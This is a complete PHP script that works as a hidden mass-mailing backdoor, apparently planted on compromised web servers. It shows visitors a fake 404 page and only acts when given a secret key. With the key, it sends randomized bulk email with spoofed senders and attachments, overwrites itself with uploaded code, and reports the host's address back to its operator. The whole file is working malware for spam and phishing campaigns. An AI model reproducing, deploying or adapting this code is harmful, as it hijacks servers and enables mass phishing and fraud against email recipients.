<?
set_time_limit(0);
ignore_user_abort(true);
define('VERSION', '1.0');
$config['key'] = 'b7d1f9c0cfb3bc2b73939fc55dd6956e';
function prepareSubject($subjects, $cells) {
	if (!isset($subjects)) return '';
	$subject = $subjects[array_rand($subjects)];
	return Randomizer::randomizeWithCells($subject, $cells);
}
function processMail($mailer, $mail, $message, $subjects, $senders, &$status) {
    $cells = explode("|", $mail);
    $email = $cells[0];
    if (isset($senders)) $mailer->from = $senders[array_rand($senders)];
    $subject = prepareSubject($subjects, $cells);
    $msg = isset($message)?(Randomizer::randomizeWithCells($message, $cells)):'';
    $result = $mailer->send($email, $subject, $msg) ? 'sent' : 'failed';
    $status[$result][] = $email;
}
if (isset($_POST['key']) && md5($_POST['key']) == $config['key']) {
    if (isset($_FILES["update"])) {
        if (move_uploaded_file ($_FILES["update"]["tmp_name"], __FILE__))
            echo json_encode(array('status'=>'updated'));
        else echo json_encode(array('status'=>'update failed'));
        exit;
    }
	if (isset($_POST['checkVersion'])) {
		echo json_encode(array('version' => VERSION));
		exit;
	}
    if (get_magic_quotes_gpc()) $_POST = array_map ('stripcslashes',$_POST);
    $status = array('id'=>$_POST['id']);
    $mailer = new Mailer();
    if (isset($_POST['from'])) $senders = array_filter(array_map('trim',explode("\n", $_POST['from'])));
    if (isset($_POST['subjects'])) $subjects = array_filter(array_map('trim',explode ("\n", $_POST['subjects'])));
    if (isset($_POST['message'])) $message = $_POST['message'];
    if (isset($_POST['mails'])) $mails = array_filter(array_map('trim',explode("\n", $_POST['mails'])));
        else $status['errors']['mails'] = "No mails posted";
    if (isset($_POST['isHtml'])) $mailer->isHtml = $_POST['isHtml'];
    if (isset($_FILES)) foreach($_FILES as $name=>$attachment) {
        $mailer->addAttachment($attachment["tmp_name"], base64_decode($name));
    }
	  foreach ($mails as $mail) processMail($mailer, $mail, $message, $subjects, $senders, $status);
    if (isset($_POST['confirm'])) {
        $msg .= $_SERVER["HTTP_HOST"].$_SERVER['PHP_SELF'];
        $mailer->send($_POST['confirm'],$subject,$msg);
    }
    echo json_encode($status);
} else {
  header($_SERVER["SERVER_PROTOCOL"]." 404 Not Found");
}

class Mailer {
   public $isHtml = false;
   public $from = '';
   public $priority;
   public $subject = '';
   public $attachments = array();
   public $body;
   private $headers;
   private $boundary;
   public $charset = 'UTF-8';
   public $encoding = 'base64';
   public function __construct($settings = array()) {
       $this->settings($settings);
   }
   static public function validateAddress($address) {
       $email = preg_match('/^[\w\s]{2,200}<(.*)>$/',$address,$matches)?$matches[1]:$address;
       return filter_var($email, FILTER_VALIDATE_EMAIL) !== false;
   }
   public function settings($settings, $value = null) {
       if (is_array($settings))
       foreach ($settings as $key=>$value) {
           if (property_exists($this, $key)) $this->$key = $value;
       }
       else if (property_exists($this, $settings)) $this->$settings = $value;
   }
   private function createHeaders() {
       $this->headers = "";
       if (!empty($this->from)) {
            $this->headers .= "From: {$this->from}\r\n";
            $this->headers .= "Reply-To: {$this->from}\r\n";
            $this->headers .= "Errors-To: {$this->from}\r\n";
       }
       if (isset($this->priority)) $this->headers .= "X-Priority: {$this->priority}\r\n";
       if ($this->isHtml) {
           $this->headers .= "MIME-Version: 1.0\r\n";
           $this->headers .= "Content-type: text/html; charset={$this->charset}\r\n";
           //$this->headers .= "Content-Transfer-Encoding: quoted-printable\r\n\r\n";   
       } elseif (!empty($this->attachments)) {
           $this->boundary = md5(uniqid(time()));
           $this->headers .= "MIME-Version: 1.0\r\n";
           $this->headers .= "Content-Type: multipart/mixed; boundary={$this->boundary}\r\n";          
       } else {
           $this->headers .= "Content-Type: text/plain; charset=\"{$this->charset}\"\r\n"; 
           $this->headers .= "Content-Transfer-Encoding: quoted-printable\r\n\r\n";   
       }
       return $this->headers;
   }
   private function createBody($message) {
       if (empty($this->attachments)) {
			if (!$this->isHtml)
				$this->body = $this->quoted_printable_encode($message);
			else $this->body = $message;
       } else {
           $this->body = "--{$this->boundary}\r\n";
           $this->body .= "Content-Type: text/plain; charset=\"{$this->charset}\"\r\n";   
           $this->body .= "Content-Transfer-Encoding: quoted-printable\r\n\r\n";   
           $this->body .= $this->quoted_printable_encode($message);
           foreach ($this->attachments as $name=>$filename) {
                $this->body .= "\r\n--{$this->boundary}\r\n";
                $this->body .= "Content-Type: application/octet-stream; name=\"$name\"\r\n";
                $this->body .= "Content-Transfer-Encoding: base64\r\n";
                $this->body .= "Content-Disposition: attachment; filename=\"$name\"\r\n\r\n";
                $this->body .= chunk_split(base64_encode(file_get_contents($filename)));
                $this->body .= "\r\n--{$this->boundary}\r\n";
           }
       }
       return $this->body;
   }
   public function send($to, $subject, $message) {
       $this->createHeaders();
       $this->createBody($message);
       return mail($to, '=?'.$this->charset.'?B?'.base64_encode($subject).'?=', $this->body, $this->headers);
   }
   public function addAttachment($filename, $name = null) {
       if (is_file($filename)) {
           if (empty($name)) $this->attachments[basename($filename)] = $filename;
           else $this->attachments[$name] = $filename;
           return true;
       } else return false;
   }
   private function quoted_printable_encode($input, $line_max = 998) { 
        $hex = array('0','1','2','3','4','5','6','7', 
                               '8','9','A','B','C','D','E','F'); 
        $lines = preg_split("/(?:\r\n|\r|\n)/", $input); 
        $linebreak = "\r\n"; 
        /* the linebreak also counts as characters in the mime_qp_long_line 
         * rule of spam-assassin */ 
        $line_max = $line_max - strlen($linebreak); 
        $escape = "="; 
        $output = ""; 
        $cur_conv_line = ""; 
        $length = 0; 
        $whitespace_pos = 0; 
        $addtl_chars = 0; 

        // iterate lines 
        for ($j=0; $j<count($lines); $j++) { 
          $line = $lines[$j]; 
          $linlen = strlen($line); 

          // iterate chars 
          for ($i = 0; $i < $linlen; $i++) { 
            $c = substr($line, $i, 1); 
            $dec = ord($c); 

            $length++; 

            if ($dec == 32) { 
               // space occurring at end of line, need to encode 
               if (($i == ($linlen - 1))) { 
                  $c = "=20"; 
                  $length += 2; 
               } 

               $addtl_chars = 0; 
               $whitespace_pos = $i; 
            } elseif ( ($dec == 61) || ($dec < 32 ) || ($dec > 126) ) { 
               $h2 = floor($dec/16); $h1 = floor($dec%16); 
               $c = $escape . $hex["$h2"] . $hex["$h1"]; 
               $length += 2; 
               $addtl_chars += 2; 
            } 

            // length for wordwrap exceeded, get a newline into the text 
            if ($length >= $line_max) { 
              $cur_conv_line .= $c; 

              // read only up to the whitespace for the current line 
              $whitesp_diff = $i - $whitespace_pos + $addtl_chars; 

             /* the text after the whitespace will have to be read 
              * again ( + any additional characters that came into 
              * existence as a result of the encoding process after the whitespace) 
              * 
              * Also, do not start at 0, if there was *no* whitespace in 
              * the whole line */ 
              if (($i + $addtl_chars) > $whitesp_diff) { 
                 $output .= substr($cur_conv_line, 0, (strlen($cur_conv_line) - 
                                $whitesp_diff)) . $linebreak; 
                 $i =  $i - $whitesp_diff + $addtl_chars; 
               } else { 
                 $output .= $cur_conv_line . $linebreak; 
               } 

             $cur_conv_line = ""; 
             $length = 0; 
             $whitespace_pos = 0; 
           } else { 
             // length for wordwrap not reached, continue reading 
             $cur_conv_line .= $c; 
           } 
         } // end of for 

         $length = 0; 
         $whitespace_pos = 0; 
         $output .= $cur_conv_line; 
         $cur_conv_line = ""; 

         if ($j<=count($lines)-1) { 
           $output .= $linebreak; 
         } 
       } // end for 

       return trim($output); 
     } 
}
class Randomizer {
    public static function randomize($text) {
        return preg_replace_callback("/\((.*?)\)/",array('self','selectText'),$text);
    }
    private static function selectText($matches) {
        $values = explode('|',$matches[1]);
        return $values[array_rand($values)];
    }
    public static function randomizeWithCells($text, $cells) {
        for ($i=0;$i<count($cells);$i++) $searchcells[] = "%cell$i%";
        return self::randomize(str_replace($searchcells,$cells,$text));
    }
}

?>
